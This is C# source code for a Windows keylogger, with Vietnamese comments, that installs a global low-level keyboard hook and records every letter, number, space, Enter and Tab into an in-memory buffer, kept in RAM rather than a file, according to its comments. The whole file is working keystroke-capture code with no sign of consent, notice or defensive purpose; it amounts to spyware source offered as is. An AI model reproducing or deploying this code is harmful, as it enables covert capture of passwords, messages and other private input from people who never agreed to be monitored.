using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Text;

namespace KeyLogger
{
    class appstart
    {
        // Lưu phím vào RAM thay vì file .txt để tốc độ cực nhanh
        public static StringBuilder logBuffer = new StringBuilder();
        // Khóa an toàn để không bị lỗi khi vừa gõ vừa in
        public static readonly object logLock = new object();
    }

    class InterceptKeys
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        public static void startKLog()
        {
            _hookID = SetHook(_proc);
            Application.Run(); // Vòng lặp giữ cho Hook hoạt động
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;
                string log = "";

                // Xử lý phím gọn gàng
                if (key == Keys.Enter) log = Environment.NewLine;
                else if (key == Keys.Space) log = " ";
                else if (key == Keys.Back) log = ""; // Không cần log backspace
                else if (key == Keys.Tab) log = " [TAB] ";
                else if (key.ToString().Length == 1) log = key.ToString(); // Chữ cái/Số

                if (log != "")
                {
                    // Dùng lock lưu vào RAM an toàn
                    lock (appstart.logLock)
                    {
                        appstart.logBuffer.Append(log);
                    }
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
    }
}